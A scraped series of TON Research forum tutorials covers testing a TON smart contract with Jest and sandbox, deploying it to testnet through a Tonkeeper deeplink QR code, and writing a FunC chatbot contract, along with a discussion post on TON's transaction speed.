To understand why the constructor is the way it is, I advise you to start from [here](https://docs.ton.org/develop/howto/step-by-step).

The most important thing to know now is that the `data` is the data that will be in the c4 register when the contract is initialized.

For convenience, we will take the data for the contract from the config, so we will create a static class for this.

```
import { Address,beginCell,Cell,Contract, contractAddress } from "ton-core";

export class MainContract implements Contract {
	constructor(
		readonly address: Address,
		readonly init?: { code: Cell, data: Cell }
	){}

	static createFromConfig(config: any, code: Cell, workchain = 0){
		const data = beginCell().endCell();
		const init = { code,data };
		const address = contractAddress(workchain, init);

		return new MainContract(address,init);
	}
}
```

In order to deploy a smart contract, you need the smart contract code and its initial data, we will put all this in the config, for the convenience of tests and deployment.

We return to the `main.spec.ts` file. Now we have the code and the wrapper, let’s use the `openContract` function from sandbox to open the contract using the config.

```
import { Cell, Address  } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";

describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);
	});
});
```

Config is empty for now, we’ll come back to it later. We will also import the `Address` from the `ton-core`, we will need it for tests. In order to test the contract, we need an entity that will allow us to send messages, in the `sandbox` this is `treasury`.

```
import { Cell, Address } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";

describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");
	});
});
```

So for tests we need to send internal messages. Therefore, it is necessary to modify our wrapper. Let’s add `sendInternalMessage` to the `MainContract.ts`.

```
import { Address,beginCell,Cell,Contract, contractAddress, ContractProvider, Sender, SendMode } from "ton-core";

export class MainContract implements Contract {
	constructor(
		readonly address: Address,
		readonly init?: { code: Cell, data: Cell }
	){}

	static createFromConfig(config: any, code: Cell, workchain = 0){
		const data = beginCell().endCell();
		const init = { code,data };
		const address = contractAddress(workchain, init);

		return new MainContract(address,init);
	}

	async sendInternalMessage(
		provider: ContractProvider,
		sender: Sender,
		value: bigint,
	){
		await provider.internal(sender,{
		value,
			sendMode: SendMode.PAY_GAS_SEPARATELY,
			body: beginCell().endCell(),
		});
	}
}
```

Go back to the test file `main.spec.ts` and use the method we just wrote in the wrapper:

```
import { Cell, Address, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";

describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");

		myContract.sendInternalMessage(senderWallet.getSender(),toNano("0.05"));
	});
});
```

In the wrapper, you could see that the TON value that needs to be sent is of the bigint type, so the tests themselves use the convenient `toNano` function, which translates the human-readable number into `bigInt`. To check if sending a message worked correctly, you need to call the `getMethod`, as in the case of sending a message, you first need to work with the wrapper Add it to `MainContract.ts`:

```
import { Address,beginCell,Cell,Contract, contractAddress, ContractProvider, Sender, SendMode } from "ton-core";

export class MainContract implements Contract {
	constructor(
		readonly address: Address,
		readonly init?: { code: Cell, data: Cell }
	){}

	static createFromConfig(config: any, code: Cell, workchain = 0){
		const data = beginCell().endCell();
		const init = { code,data };
		const address = contractAddress(workchain, init);

		return new MainContract(address,init);
	}

	async sendInternalMessage(
		provider: ContractProvider,
		sender: Sender,
		value: bigint,
	){
		await provider.internal(sender,{
			value,
			sendMode: SendMode.PAY_GAS_SEPARATELY,
			body: beginCell().endCell(),
		});
	}

	async getData(provider: ContractProvider) {
		const { stack } = await provider.get("get_sender", []);
		return {
			recent_sender: stack.readAddress(),
			number: stack.readNumber(),
		};
	}
}
```

Finally, we have done all the preparatory steps for the tests and now we can do them, for convenience we will install `test-utils`. This library will makes us able to use cutsom matches for our Jest test framework.

```
yarn add @ton-community/test-utils
```

We import the utilities into a file with tests and also pass the result of sending a message to a variable.

```
import { Cell, Address, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";
import "@ton-community/test-utils";

describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");

		const sentMessageResult = await myContract.sendInternalMessage(senderWallet.getSender(),toNano("0.05"));
	});
});
```

Here we will add the first test, we will check that the transaction with our message has passed.

```
import { Cell, Address, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";
import "@ton-community/test-utils";

describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");

		const sentMessageResult = await myContract.sendInternalMessage(senderWallet.getSender(),toNano("0.05"));

		expect(sentMessageResult.transactions).toHaveTransaction({
			from: senderWallet.address,
			to: myContract.address,
			success: true,
		});

	});
});
```

Next, we call the get method and check that the correct address is returned in accordance with the logic of the contract.

```
import { Cell, Address, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";
import "@ton-community/test-utils";

describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");

		const sentMessageResult = await myContract.sendInternalMessage(senderWallet.getSender(),toNano("0.05"));

		expect(sentMessageResult.transactions).toHaveTransaction({
			from: senderWallet.address,
			to: myContract.address,
			success: true,
		});

		const getData = await myContract.getData();

		expect(getData.recent_sender.toString()).toBe(senderWallet.address.toString());

	});
});
```

Run the tests by writing in the console: `yarn test`. If you did everything right, you should see:

```
Pass
Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
```

It remains to check the unity, which we also saved, we will check with `toEqual()`:

```
import { Cell, Address, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";
import "@ton-community/test-utils";

describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");

		const sentMessageResult = await myContract.sendInternalMessage(senderWallet.getSender(),toNano("0.05"));

		expect(sentMessageResult.transactions).toHaveTransaction({
			from: senderWallet.address,
			to: myContract.address,
			success: true,
		});

		const getData = await myContract.getData();

		expect(getData.recent_sender.toString()).toBe(senderWallet.address.toString());
		expect(getData.number).toEqual(1); 
	});
});
```

## [](#conclusion-3)Conclusion

The tests have been passed and we need to deploy the contract to the network, in the next tutorial we will make a convenient deployment system.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/simpletest.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/pipeline/simpletest.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/simpletest.md)

````
# Smart Contract Pipeline Part2 - Tests for our smart contract in pipeline 

## Introduction

In the [first part](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/simplesmartcontract.md), we created a project and wrote a simple smart contract, it's time for tests.

## Let's start working on tests

For tests, we need a testing framework, in our case it will be [jest](https://jestjs.io), we also need to emulate the operation of the blockchain, for this we will use [ton-community/sandbox](https://github.com/ton-community/sandbox). Install:

```bash
yarn add @ton-community/sandbox jest ts-jest @types/jest ton --dev
```
To use the jest framework, you need a configuration file. Let's create a file `jets.config.js` and add there:
```js
	/** @type {import('ts-jest').JestConfigWithTsJest} */
	module.exports = {
	  preset: 'ts-jest',
	  testEnvironment: 'node',
	};
````

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/simpletest.md)

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 439

[TON Research](/)

# [Create a Pipeline to work with smart contracts - Lesson 3 Convenient deployment to the test network](/t/create-a-pipeline-to-work-with-smart-contracts-lesson-3-convenient-deployment-to-the-test-network/439)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 2:01pm  1

## [](#introduction-1)Introduction

In the first two parts, we analyzed [compiling](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/simplesmartcontract.md) and [testing](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/simpletest.md).In this tutorial, we will make a convenient deployment of our contract to the test network, for this we will generate a link for the deployment, which we will present in the form of a QR code, we will scan the code with a wallet and thus the deployment will take place.

The question may arise, what is the link for deployment - to deploy a smart contract, you need to send a message with data about the contract, we will do it in the following way, we will form a [deeplink](https://github.com/tonkeeper/wallet-api) for the Tonkeeper wallet into this deeplink we will transfer all the data for deployment and then from the link it will be possible make a QR, which, when scanned by a wallet, will deploy a contract, transferring all the information to the blockchain.

## [](#deploy-script-2)Deploy script

Let’s create a separate file for deploying to testnet `deploy.ts`.

### [](#stateinit-3)StateInit

[StateInit](https://docs.ton.org/develop/data-formats/msg-tlb#stateinit-tl-b) serves to delivery inital data to contract and used in contract deployment.

At the top level, to deploy to the testnet or mainnet, we need to send a `StateInit` message to the network. `StateInit` consists of a cell with a code and a cell with data, and the smart contract address is roughly equal to: `hash(initial code, initial state)`.

Let’s collect the `StateInit` and send a message for deployment.

In the `deploy.ts` file, create the `deployContract()` function:

```
async function deployContract() {
}

deployContract()
```

Let’s import the necessary additional functions from `ton-core`, as well as our smart contract in `hex` format:

```
import { Cell, StateInit, beginCell, contractAddress, storeStateInit, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";

async function deployContract() {
}

deployContract()
```

We will get the cell with the code from the `hex` representation of the contract, there will be no starting data - we create an empty cell. Now we have data ready to form `StateInit`

```
import { Cell, StateInit, beginCell, contractAddress, storeStateInit, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";

async function deployContract() {
	const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];
	const dataCell = new Cell();   

	const stateInit: StateInit = {
		code: codeCell,
		data: dataCell,
	};
}

deployContract()
```

Now we need to build `StateInit` by first creating `Builder`(Data bits and references to other cells can be stored in a builder, and then the builder can be finalized to a new cell.) , but we use the helper functions from `ton-core` `storeStateInit`, we get:

```
import { Cell, StateInit, beginCell, contractAddress, storeStateInit, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";

async function deployContract() {
	const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];
	const dataCell = new Cell();   

	const stateInit: StateInit = {
		code: codeCell,
		data: dataCell,
	};
	
	const stateInitBuilder = beginCell();
	storeStateInit(stateInit)(stateInitBuilder);
	const stateInitCell = stateInitBuilder.endCell();

}

deployContract()
```

Above, we said that you can get the address from the source data, let’s do it with the help of `contractAddress`:

```
import { Cell, StateInit, beginCell, contractAddress, storeStateInit, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";

async function deployContract() {
	const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];
	const dataCell = new Cell();   

	const stateInit: StateInit = {
		code: codeCell,
		data: dataCell,
	};

	const stateInitBuilder = beginCell();
	storeStateInit(stateInit)(stateInitBuilder);
	const stateInitCell = stateInitBuilder.endCell();

	const address = contractAddress(0, {
		code: codeCell,
		data: dataCell,
	});

}

deployContract()
```

### [](#qr-code-4)QR code

Let’s start forming a string for deploying a contract:

Install the library for convenient string generation

```
yarn add qs @types/qs --dev
```

And a library for generating a QR code.

```
yarn add qrcode-terminal @types/qrcode-terminal --dev
```

To send a message, we need to use deeplink [/transfer](https://github.com/tonkeeper/wallet-api#payment-urls):

```
ton://transfer/<address>
ton://transfer/<address>?amount=<nanocoins>
ton://transfer/<address>?text=<url-encoded-utf8-text>
ton://transfer/<address>?bin=<url-encoded-base64-boc>
ton://transfer/<address>?bin=<url-encoded-base64-boc>&init=<url-encoded-base64-boc>

https://app.tonkeeper.com/transfer/<address>
https://app.tonkeeper.com/transfer/<address>?amount=<nanocoins>
https://app.tonkeeper.com/transfer/<address>?text=<url-encoded-utf8-text>
https://app.tonkeeper.com/transfer/<address>?bin=<url-encoded-base64-boc>
https://app.tonkeeper.com/transfer/<address>?bin=<url-encoded-base64-boc>&init=<url-encoded-base64-boc>
```

Using the qs library, we will collect the following line:

```
	 let deployLink =
		'https://app.tonkeeper.com/transfer/' +
		address.toString({
			testOnly: true,
		}) +
		"?" +
		qs.stringify({
			text: "Deploy contract by QR",
			amount: toNano("0.1").toString(10),
			init: stateInitCell.toBoc({idx: false}).toString("base64"),
		});
```

Now QR code:

```
	qrcode.generate(deployLink, {small: true }, (qr) => {
		console.log(qr);
	});
```

At the end, we will generate a link to the blockchain explorer in the test network, for our convenience - after the deployment, we will see that the contract is ready.

Final code:

```
import { Cell, StateInit, beginCell, contractAddress, storeStateInit, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import qs from "qs";
import qrcode from "qrcode-terminal";

async function deployContract() {
	const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];
	const dataCell = new Cell();   

	const stateInit: StateInit = {
		code: codeCell,
		data: dataCell,
	};

	const stateInitBuilder = beginCell();
	storeStateInit(stateInit)(stateInitBuilder);
	const stateInitCell = stateInitBuilder.endCell();

	const address = contractAddress(0, {
		code: codeCell,
		data: dataCell,
	});


	let deployLink =
		'https://app.tonkeeper.com/transfer/' +
		address.toString({
			testOnly: true,
		}) +
		"?" +
		qs.stringify({
			text: "Deploy contract by QR",
			amount: toNano("0.1").toString(10),
			init: stateInitCell.toBoc({idx: false}).toString("base64"),
		});

	qrcode.generate(deployLink, {small: true }, (qr) => {
		console.log(qr);
	});

	let scanAddr = 
		'https://testnet.tonscan.org/address/' +
		address.toString({
			testOnly: true,
		})

	console.log(scanAddr);

	}

deployContract()
```

Upgrade the file `package.json` by adding `"deploy": "yarn compile && ts-node ./scripts/deploy.ts"` to scripts:

```
{
  "name": "test_folder",
  "version": "1.0.0",
  "main": "index.js",
  "license": "MIT",
  "devDependencies": {
	"@swc/core": "^1.3.63",
	"@ton-community/func-js": "^0.6.2",
	"@ton-community/sandbox": "^0.11.0",
	"@types/jest": "^29.5.2",
	"@types/node": "^20.3.1",
	"@types/qrcode-terminal": "^0.12.0",
	"@types/qs": "^6.9.7",
	"jest": "^29.5.0",
	"qrcode-terminal": "^0.12.0",
	"qs": "^6.11.2",
	"ton": "^13.5.0",
	"ton-core": "^0.49.1",
	"ton-crypto": "^3.2.0",
	"ts-jest": "^29.1.0",
	"ts-node": "^10.9.1",
	"typescript": "^5.1.3"
 },
  "scripts": {
	"compile": "ts-node ./scripts/compile.ts",
	"test": "yarn jest",
	"deploy": "yarn compile && ts-node ./scripts/deploy.ts"
  },
  "dependencies": {
	"@ton-community/test-utils": "^0.2.0"
  }
}
```

It remains to run it all:

1.  in the console we type the command yarn deploy
2.  scan the QR code in the Tonkeeper switched to the test network
3.  confirm the transaction
4.  look in the explorer that the contract is deployed

## [](#conclusion-5)Conclusion

Thank you for your attention, in the next two tutorials we will pay attention to messages, what to build on when writing tests and how to write tests for the test network.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/simpledeploy.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/pipeline/simpledeploy.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/simpledeploy.md)

```
# Smart Contract Pipeline Part3 - Convenient deployment to the test network

## Introduction

In the first two parts, we analyzed [compiling](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/simplesmartcontract.md) and [testing](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/simpletest.md).In this tutorial, we will make a convenient deployment of our contract to the test network, for this we will generate a link for the deployment, which we will present in the form of a QR code, we will scan the code with a wallet and thus the deployment will take place.

The question may arise, what is the link for deployment - to deploy a smart contract, you need to send a message with data about the contract, we will do it in the following way, we will form a [deeplink](https://github.com/tonkeeper/wallet-api) for the Tonkeeper wallet into this deeplink we will transfer all the data for deployment and then from the link it will be possible make a QR, which, when scanned by a wallet, will deploy a contract, transferring all the information to the blockchain.

## Deploy script

Let's create a separate file for deploying to testnet `deploy.ts`. 

### StateInit

[StateInit](https://docs.ton.org/develop/data-formats/msg-tlb#stateinit-tl-b) serves to delivery inital data to contract and used in contract deployment.
 
At the top level, to deploy to the testnet or mainnet, we need to send a `StateInit` message to the network. `StateInit` consists of a cell with a code and a cell with data, and the smart contract address is roughly equal to: `hash(initial code, initial state)`.

Let's collect the `StateInit` and send a message for deployment.

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/simpledeploy.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 44

[TON Research](/)

# [Evaluating The Open Network's Record-Breaking Speed: Transformative Use Cases and Future Implications](/t/evaluating-the-open-networks-record-breaking-speed-transformative-use-cases-and-future-implications/44)

[Application](/c/application/20) 

    

[kingsman](https://tonresear.ch/u/kingsman)  January 23, 2024, 1:58pm  1

The Open Network (TON) has recently achieved a significant milestone by setting a new world record for the fastest blockchain, recording a speed of 104,715 transactions per second. This groundbreaking development opens the door to numerous possibilities for blockchain applications in various sectors. In light of this achievement, we seek to explore the practical implications of TON’s high-speed blockchain technology in real-world scenarios and its potential to bridge the gap between Web3 and Web2 technologies.

1.  How does TON’s record-breaking transaction speed compare with other leading blockchains in terms of technical capabilities and scalability? Please provide a detailed analysis, including mathematical formulations where applicable, to illustrate TON’s superior performance.
2.  What are the potential applications of TON’s high-speed blockchain in developing a SuperApp platform? Discuss how this could revolutionize user experience and transaction efficiency in integrated services like messaging, DeFi, and e-commerce.
3.  Examine the implications of TON’s blockchain speed for the gaming industry, particularly in terms of in-game economies and the potential for customized workchains. How might this impact game development and player experiences compared to current blockchain gaming platforms?
4.  Assess the role of TON in redefining payment infrastructure for both individual and business transactions. How could its speed and scalability facilitate global financial transactions and promote financial inclusivity, especially for microtransactions and the unbanked population?
5.  In the context of decentralized exchanges (DEXs) and DeFi, how could TON’s transaction speed foster high-frequency trading and market stability in a decentralized environment? Discuss the potential impact on market accessibility, slippage, and overall trading dynamics.
6.  Explore the application of TON’s technology in supply chain management. How can its infrastructure enhance real-time tracking, immediate settlement, and fraud prevention, particularly in industries with complex logistics like pharmaceuticals?
7.  Analyze the suitability of TON for managing Internet of Things (IoT) networks. Discuss how its transaction speed could enable smoother machine-to-machine communications and contribute to the development of smarter cities and energy grids.
8.  Finally, consider the broader implications of TON’s transaction speed for the future of blockchain technology. How does this achievement position TON in the context of global digital infrastructure, and what are the potential new use cases and sectors that TON could revolutionize or even create?

This comprehensive discussion aims to shed light on the transformative potential of TON’s high-speed blockchain technology across various industries and its role in driving innovation and adoption in the digital world. Contributions from experts in blockchain technology, digital economics, and industry-specific applications are highly valuable for this analysis.

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 440

[TON Research](/)

# [Create a Pipeline to work with smart contracts - Lesson 4 Chatbot smart contract](/t/create-a-pipeline-to-work-with-smart-contracts-lesson-4-chatbot-smart-contract/440)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 2:07pm  1

## [](#introduction-1)Introduction

In this tutorial, we will analyze the chatbot smart contract. Which we need in order to figure out how to inspect transactions in tests and for onchain tests.

## [](#about-ton-2)About TON

TON is an [actor model](https://en.wikipedia.org/wiki/Actor_model) is a mathematical parallel computing model that underlies TON smart contracts. In it, each smart contract can receive one message, change its own state, or send one or more messages per unit of time.

Most often, to create a full-fledged application on TON, you need to write several smart contracts that seem to communicate with each other using messages. In order for the contract to understand what it needs to do when a message arrives, it is recommended to use `op`. `op` is a 32-bit identifier that should be passed in the body of the message.

Thus, inside the message using conditional statements, depending on the smart contract `op` performs different actions.

Therefore, it is important to be able to test messages, which we will do today.

The chatbot smart contract receives any internal message and responds to it with an internal message with the reply text.

## [](#parsing-the-contract-3)Parsing the contract

##### [](#standard-library-4)Standard Library

The first thing to do is [import the standard library](https://ton-blockchain.github.io/docs/#/func/stdlib). The library is just a wrapper for the most common TVM (TON virtual machine) commands that are not built-in.

```
#include "imports/stdlib.fc";
```

To process internal messages, we need the `recv_internal()` method

```
() recv_internal()  {

}
```

##### [](#external-method-arguments-5)External method arguments

Here a logical question arises - how to understand what arguments a function should have so that it can receive messages on the TON network?

According to the documentation of the [TON virtual machine - TVM](https://ton-blockchain.github.io/docs/tvm.pdf), when an event occurs on an account in one of the TON chains, it triggers a transaction.

Each transaction consists of up to 5 stages. More details [here](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview?id=transactions-and-phases).

We are interested in **Compute phase**. And to be more specific, what is “on the stack” during initialization. For normal post-triggered transactions, the initial state of the stack looks like this:

5 elements:

*   Smart contract balance (in nanoTons)
*   Incoming message balance (in nanotones)
*   Cell with incoming message
*   Incoming message body, slice type
*   Function selector (for recv\_internal it is 0)

```
() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body)  {

}
```

But it is not necessary to write all the arguments to `recv_internal()`. By setting arguments to `recv_internal()`, we tell the smart contract code about some of them. Those arguments that the code will not know about will simply lie at the bottom of the stack, never touched. For our smart contract, this is:

```
	() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {

	}
```

##### [](#gas-to-handle-messages-6)Gas to handle messages

Our smart contract will need to use the gas to send the message further, so we will check with what msg\_value the message came, if it is very small (less than 0.01 TON), we will finish the execution of the smart contract with `return()`.

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {

  if (msg_value < 10000000) { ;; 10000000 nanoton == 0.01 TON
	return ();
  }
  
}
```

##### [](#get-the-address-7)Get the address

To send a message back, you need to get the address of the person who sent it to us. To do this, you need to parse the `in_msg` cell.

In order for us to take the address, we need to convert the cell into a slice using `begin_parse`:

```
var cs = in_msg_full.begin_parse();
```

Now we need to “subtract” the resulting slice to the address. Using the `load_uint` function from the [FunC standard library](https://ton-blockchain.github.io/docs/#/func/stdlib) it loads an unsigned n-bit integer from the slice, “subtract” the flags.

```
var flags = cs~load_uint(4);
```

In this lesson, we will not dwell on the flags in detail, but you can read more in paragraph \[3.1.7\] ([https://ton-blockchain.github.io/docs/tblkch.pdf](https://ton-blockchain.github.io/docs/tblkch.pdf)).

And finally, the address. Use `load_msg_addr()` - which loads from the slice the only prefix that is a valid MsgAddress.

```
slice sender_address = cs~load_msg_addr(); 
```

Code:

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {

  if (msg_value < 10000000) { ;; 10000000 nanoton == 0.01 TON
	return ();
  }
  
  slice cs = in_msg.begin_parse();
  int flags = cs~load_uint(4); 
  slice sender_address = cs~load_msg_addr(); 

}
```

##### [](#sending-a-message-8)Sending a message

Now you need to send a message back

##### [](#message-structure-9)Message structure

The full message structure can be found [here - message layout](https://ton-blockchain.github.io/docs/#/smart-contracts/messages?id=message-layout). But usually we don’t need to control each field, so we can use the short form from [example](https://ton-blockchain.github.io/docs/#/smart-contracts/messages?id=sending-messages):

```
 var msg = begin_cell()
	.store_uint(0x18, 6)
	.store_slice(addr)
	.store_coins(amount)
	.store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	.store_slice(message_body)
  .end_cell();
```

As you can see, functions of the [FunC standard library](https://ton-blockchain.github.io/docs/#/func/stdlib) are used to build the message. Namely, the “wrapper” functions of the Builder primitives (partially built cells, as you may remember from the first lesson). Consider:

`begin_cell()` - will create a Builder for the future cell  
`end_cell()` - will create a Cell (cell)  
`store_uint` - store uint in Builder  
`store_slice` - store the slice in the Builder  
`store_coins` - here the documentation means `store_grams` - used to store TonCoins. More details [here](https://ton-blockchain.github.io/docs/#/func/stdlib?id=store_grams).

##### [](#message-body-10)Message body

In the body of the message we put `op` and our message `reply`, to put a message we need to do `slice`.

```
slice msg_text = "reply";
```

In the recommendations about the body of the message, there is a recommendation to add `op`, despite the fact that it will not carry any functionality here, we will add it.

In order for us to create a similar client-server architecture on smart contracts described in the recommendations, it is proposed to start each message (strictly speaking, the message body) with some `op` flag, which will identify what operation the smart contract should perform.

Let’s put `op` equal to 0 in our message.

Now the code looks like this:

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {

  if (msg_value < 10000000) { ;; 10000000 nanoton == 0.01 TON
	return ();
  }
	  
  slice cs = in_msg.begin_parse();
  int flags = cs~load_uint(4); 
  slice sender_address = cs~load_msg_addr(); 

  slice msg_text = "reply"; 

  cell msg = begin_cell()
	  .store_uint(0x18, 6)
	  .store_slice(sender_address)
	  .store_coins(100) 
	  .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	  .store_uint(0, 32)
	  .store_slice(msg_text) 
  .end_cell();

	}
```

The message is ready, let’s send it.

##### [](#message-sending-modemode-11)Message sending mode(mode)

To send messages, use `send_raw_message` from the [standard library](https://ton-blockchain.github.io/docs/#/func/stdlib?id=send_raw_message).

We have already collected the msg variable, it remains to figure out `mode`. Description of each mode is in [documentation](https://ton-blockchain.github.io/docs/#/func/stdlib?id=send_raw_message). Let’s look at an example to make it clearer.

Let there be 100 coins on the balance of the smart contract and we receive an internal message with 60 coins and send a message with 10, the total fee is 3.

`mode = 0` - balance (100+60-10 = 150 coins), send(10-3 = 7 coins)  
`mode = 1` - balance (100+60-10-3 = 147 coins), send(10 coins)  
`mode = 64` - balance (100-10 = 90 coins), send (60+10-3 = 67 coins)  
`mode = 65` - balance (100-10-3=87 coins), send (60+10 = 70 coins)  
`mode = 128` -balance (0 coins), send (100+60-3 = 157 coins)

As we choose `mode`, let’s go to [documentation](https://docs.ton.org/develop/smart-contracts/messages#message-modes):

*   We’re sending a normal message, so mode 0.
*   We will pay the commission for the transfer separately from the cost of the message, which means +1.
*   We will also ignore any errors that occur during the processing of this message on the action phase, so +2.

We get `mode` == 3, the final smart contract:

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {

  if (msg_value < 10000000) { ;; 10000000 nanoton == 0.01 TON
	return ();
  }
	  
  slice cs = in_msg.begin_parse();
  int flags = cs~load_uint(4); 
  slice sender_address = cs~load_msg_addr(); 

  slice msg_text = "reply"; 

  cell msg = begin_cell()
	  .store_uint(0x18, 6)
	  .store_slice(sender_address)
	  .store_coins(100) 
	  .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	  .store_uint(0, 32)
	  .store_slice(msg_text) 
  .end_cell();

  send_raw_message(msg, 3);
}
```

##hexBoC

Before deploying a smart contract, you need to compile it into hexBoС, let’s take the project from the previous tutorial.

Let’s rename `main.fc` to `chatbot.fc` and write our smart contract into it.

Since we changed the filename, we need to upgrade `compile.ts` as well:

```
import * as fs from "fs";
import { readFileSync } from "fs";
import process from "process";
import { Cell } from "ton-core";
import { compileFunc } from "@ton-community/func-js";

async function compileScript() {

	const compileResult = await compileFunc({
		targets: ["./contracts/chatbot.fc"], 
		sources: (path) => readFileSync(path).toString("utf8"),
	});

	if (compileResult.status ==="error") {
		console.log("Error happend");
		process.exit(1);
	}

	const hexBoC = 'build/main.compiled.json';

	fs.writeFileSync(
		hexBoC,
		JSON.stringify({
			hex: Cell.fromBoc(Buffer.from(compileResult.codeBoc,"base64"))[0]
				.toBoc()
				.toString("hex"),
		})

	);

	console.log("Compiled, hexBoC:"+hexBoC);

}

compileScript();
```

Compile the smart contract with the `yarn compile` command.

You now have a `hexBoC` representation of the smart contract.

## [](#conclusion-12)Conclusion

In the next tutorial, we will write onchain tests.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/chatbot.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/pipeline/chatbot.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/chatbot.md)

```
## Introduction

In this tutorial, we will analyze the chatbot smart contract. Which we need in order to figure out how to inspect transactions in tests and for onchain tests.

## About TON

TON is an [actor model](https://en.wikipedia.org/wiki/Actor_model) is a mathematical parallel computing model that underlies TON smart contracts. In it, each smart contract can receive one message, change its own state, or send one or more messages per unit of time.

